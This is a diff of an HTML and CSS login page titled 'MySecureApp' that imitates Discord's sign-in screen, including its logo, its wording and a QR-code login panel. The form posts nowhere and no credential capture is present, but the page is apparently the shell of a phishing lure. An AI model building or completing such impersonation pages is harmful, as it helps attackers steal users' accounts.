@@ -1,122 +1,354 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Login – MySecureApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; margin:0; padding:0; }
-    body {
-      font-family:'Inter',Helvetica,Arial,sans-serif;
-      display:flex;align-items:center;justify-content:center;
-      min-height:100vh;
-      background-color:#313338;
-      padding:20px;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
-    @media(min-width:769px){
-      body{
-        background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJq7p812cjimwGXUviON7suVfdym1Yds1-fOPWeJ89v3Rh1PyaI-8L5zU&s=10');
-        background-size:cover;
-        background-position:center;
+
+    body {
+      font-family: 'Inter', Helvetica, Arial, sans-serif;
+      background-color: #313338;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    @media (min-width: 769px) {
+      body {
+        background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJq7p812cjimwGXUviON7suVfdym1Yds1-fOPWeJ89v3Rh1PyaI-8L5zU&s=10');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
       }
     }
-    .window {
-      display:flex; width:100%; max-width:900px;
-      background:#2f3136; border-radius:8px; overflow:hidden;
-      box-shadow:0 0 15px rgba(0,0,0,0.5);
+
+    .container {
+      max-width: 900px;
+      width: 100%;
+      background-color: #2f3136;
+      border-radius: 8px;
+      display: flex;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
     }
+
     .left, .right {
-      flex:1; padding:40px; display:flex;
-      flex-direction:column; justify-content:center;
-    }
-    /* Common text/form styles */
-    h2{font-size:24px;color:#fff;font-weight:700;margin-bottom:8px;}
-    .subtext{font-size:14px;color:#b9bbbe;margin-bottom:20px;}
-    label{font-size:12px;color:#b9bbbe;font-weight:700;margin-bottom:5px;text-align:left;}
-    input,button{width:100%;padding:12px;font-size:14px;}
-    input{background:#1e1f22;color:#fff;border:none;border-radius:4px;margin-bottom:20px;}
-    input:focus{background:#2b2d31;outline:none;}
-    button{background:#5865f2;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer;transition:.2s;}
-    button:hover{background:#4752c4;transform:translateY(-1px);}
-    a{font-size:12px;color:#00a8fc;text-decoration:none;display:inline-block;margin-bottom:20px;text-align:left;}
-    .footer{font-size:12px;color:#b9bbbe;text-align:center;margin-top:20px;}
-    .footer a{color:#00a8fc;}
-
-    /* QR container on PC */
-    .qr-container{cursor:pointer;text-align:center;}
-    .qr-container img{width:130px;height:130px;margin-bottom:15px;}
-    .qr-text{font-size:12px;color:#b9bbbe;margin-top:8px;}
-
-    /* Mobile-only overrides */
-    @media(max-width:768px){
-      body{background:linear-gradient(to bottom,#2a2c31,#1e1f22);}
-      .window{flex-direction:column;border-radius:0;box-shadow:none;}
-      .right{display:none;}
-      .left{padding:0;text-align:center;align-items:center;}
-      /* logo only mobile */
-      .mobile-logo{display:block;width:160px;margin:30px auto 10px;}
-      h2{font-size:22px;margin:10px 0;color:#fff;}
-      .subtext{display:none;}
-      form{width:100%;max-width:400px;padding:0 20px;}
-      label{font-size:11px;text-transform:uppercase;color:#b9bbbe;width:100%;margin-bottom:5px;}
-      label::after{content:' *';color:#ed4245;}
-      input{background:#1e1f22;color:#fff;border:none;border-radius:0;box-shadow:none;outline:none;margin-bottom:15px;}
-      button{border-radius:6px;}
-      a{font-size:13px;width:100%;text-align:left;margin-bottom:20px;}
-      .footer{font-size:13px;margin:25px 0;}
+      flex: 1;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
     }
 
-    /* Logo hidden on PC */
-    .mobile-logo{display:none;}
+    .left h2 {
+      font-size: 24px;
+      color: #fff;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
 
-    /* Loader animation */
-    .preloader{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(20,21,23,0.85);display:flex;align-items:center;justify-content:center;z-index:999;}
-    .spinner{width:20px;height:20px;position:relative;}
-    .spinner div{width:10px;height:10px;background:#7289da;position:absolute;animation:spin 1.6s infinite ease-in-out;}
-    .spinner div:nth-child(2){animation-delay:-0.8s;}
-    @keyframes spin{
-      25%{transform:translateX(22px) rotate(-90deg) scale(.5);}
-      50%{transform:translateX(22px) translateY(22px) rotate(-180deg);}
-      75%{transform:translateX(0) translateY(22px) rotate(-270deg) scale(.5);}
-      100%{transform:rotate(-360deg);}
+    .subtext {
+      color: #b9bbbe;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 12px;
+      font-weight: 700;
+      color: #b9bbbe;
+      margin-bottom: 5px;
+      text-align: left;
+      display: block;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+    }
+
+    input {
+      background-color: #1e1f22;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+
+    input:focus {
+      background-color: #2b2d31;
+      outline: none;
+    }
+
+    button {
+      background-color: #5865f2;
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #4752c4;
+      transform: translateY(-1px);
+    }
+
+    .left a {
+      font-size: 12px;
+      color: #00a8fc;
+      text-decoration: none;
+      margin-bottom: 20px;
+      display: inline-block;
+      text-align: left;
+    }
+
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      color: #b9bbbe;
+      margin-top: 20px;
+    }
+
+    .footer a {
+      color: #00a8fc;
+      text-decoration: none;
+    }
+
+    .right {
+      background-color: #2b2d31;
+      text-align: center;
+      align-items: center;
+      border-left: 1px solid #202225;
+    }
+
+    .right img {
+      width: 130px;
+      height: 130px;
+      margin-bottom: 15px;
+    }
+
+    .right h3 {
+      color: white;
+      font-size: 16px;
+      margin: 0 0 10px;
+      font-weight: 700;
+    }
+
+    .right p {
+      color: #b9bbbe;
+      font-size: 12px;
+      max-width: 240px;
+      margin: 0 auto;
+    }
+
+    .qr-container {
+      cursor: pointer;
+    }
+
+    .qr-text {
+      font-size: 12px;
+      color: #b9bbbe;
+      margin-top: 8px;
+    }
+
+    /* PRELOADER */
+    .preloader {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(20, 21, 23, 0.9);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      position: relative;
+    }
+
+    .spinner div {
+      width: 10px;
+      height: 10px;
+      background: #7289da;
+      position: absolute;
+      animation: spin 1.6s infinite ease-in-out;
+    }
+
+    .spinner div:nth-child(2) {
+      animation-delay: -0.8s;
+    }
+
+    @keyframes spin {
+      25% {
+        transform: translateX(22px) rotate(-90deg) scale(0.5);
+      }
+      50% {
+        transform: translateX(22px) translateY(22px) rotate(-180deg);
+      }
+      75% {
+        transform: translateX(0) translateY(22px) rotate(-270deg) scale(0.5);
+      }
+      100% {
+        transform: rotate(-360deg);
+      }
+    }
+
+    /* HIDE LOGO DEFAULT */
+    .mobile-logo {
+      display: none;
+      width: 160px;
+      margin: 30px auto 10px;
+    }
+
+    /* MOBILE VIEW STYLES */
+    @media (max-width: 768px) {
+      body {
+        background: linear-gradient(to bottom, #2a2c31, #1e1f22);
+      }
+
+      .container {
+        flex-direction: column;
+        border-radius: 0;
+        box-shadow: none;
+        max-width: 100%;
+      }
+
+      .right {
+        display: none;
+      }
+
+      .left {
+        padding: 0;
+        align-items: center;
+        text-align: center;
+      }
+
+      .mobile-logo {
+        display: block;
+      }
+
+      .left h2 {
+        font-size: 22px;
+        margin: 10px 0;
+      }
+
+      .subtext {
+        display: none;
+      }
+
+      form {
+        width: 100%;
+        max-width: 400px;
+        padding: 0 20px;
+      }
+
+      label {
+        font-size: 11px;
+        text-transform: uppercase;
+        text-align: left;
+        width: 100%;
+        color: #b9bbbe;
+        margin-bottom: 5px;
+      }
+
+      label::after {
+        content: ' *';
+        color: #ed4245;
+      }
+
+      input {
+        background-color: #1e1f22;
+        color: white;
+        border: none !important;
+        border-radius: 0 !important;
+        box-shadow: none !important;
+        outline: none !important;
+        margin-bottom: 15px;
+      }
+
+      button {
+        border-radius: 6px;
+      }
+
+      .footer {
+        font-size: 13px;
+        margin: 25px 0;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="preloader" id="loader"><div class="spinner"><div></div><div></div></div></div>
+<!-- Preloader -->
+<div class="preloader" id="preloader">
+  <div class="spinner">
+    <div></div><div></div>
+  </div>
+</div>
 
 <div class="container">
-  <div class="window">
-    <div class="left">
-      <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Discord_white_textlogo_%282021%29.svg/2560px-Discord_white_textlogo_%282021%29.svg.png" alt="Discord logo">
-      <h2>Welcome back!</h2>
-      <p class="subtext">We're so excited to see you again!</p>
-      <form>
-        <label>Email or phone number</label><input type="email" required>
-        <label>Password</label><input type="password" required>
-        <a href="#">Forgot your password?</a>
-        <button type="submit">Log In</button>
-      </form>
-      <div class="footer">Need an account? <a href="#">Register</a></div>
+  <div class="left">
+    <!-- ✅ MOBILE-ONLY LOGO -->
+    <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Discord_white_textlogo_%282021%29.svg/2560px-Discord_white_textlogo_%282021%29.svg.png" alt="Discord Logo" />
+    <h2>Welcome back!</h2>
+    <p class="subtext">We're so excited to see you again!</p>
+
+    <form method="POST" action="#">
+      <label for="email">Email or phone number</label>
+      <input type="email" id="email" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" required>
+
+      <a href="#">Forgot your password?</a>
+
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="footer">
+      Need an account? <a href="#">Register</a>
     </div>
-    <div class="right">
-      <div class="qr-container" id="qr">
-        <img src="https://cdn.jsdelivr.net/gh/rajatkulkarni95/CDN/qr-sample.png" alt="QR code">
-        <div class="qr-text" id="qr-text">Refresh QR</div>
-      </div>
-      <h3 style="color:#fff;font-size:16px;font-weight:700;margin-bottom:10px;">Log in with QR Code</h3>
-      <p style="color:#b9bbbe;font-size:12px;max-width:240px;margin:0 auto;">Scan with the Discord mobile app to log in instantly.</p>
+  </div>
+
+  <div class="right">
+    <div class="qr-container" id="qr">
+      <!-- ✅ YOUR QR IMAGE -->
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbGiahyTpqaVKNchkcj2b-E--4McvzjZGtv6spT0RuFHmbi1j8RvGwQklk&s=10" alt="QR Code">
+      <div class="qr-text" id="qr-text">Refresh QR</div>
     </div>
+    <h3>Log in with QR Code</h3>
+    <p>Scan this with the <strong>Discord</strong> mobile app to log in instantly.</p>
   </div>
 </div>
 
 <script>
-window.addEventListener('load', ()=>document.getElementById('loader').style.display='none');
-document.getElementById('qr').addEventListener('click', ()=>{
-  const t=document.getElementById('qr-text');
-  t.innerText='Refreshing...'; setTimeout(()=>t.innerText='Refresh QR',1500);
-});
+  // Hide preloader
+  window.addEventListener('load', () => {
+    document.getElementById('preloader').style.display = 'none';
+  });
+
+  // Simulate QR refresh
+  document.getElementById('qr').addEventListener('click', () => {
+    const t = document.getElementById('qr-text');
+    t.innerText = 'Refreshing...';
+    setTimeout(() => t.innerText = 'Refresh QR', 1500);
+  });
 </script>
 </body>
-</html>
+    </html>
+    
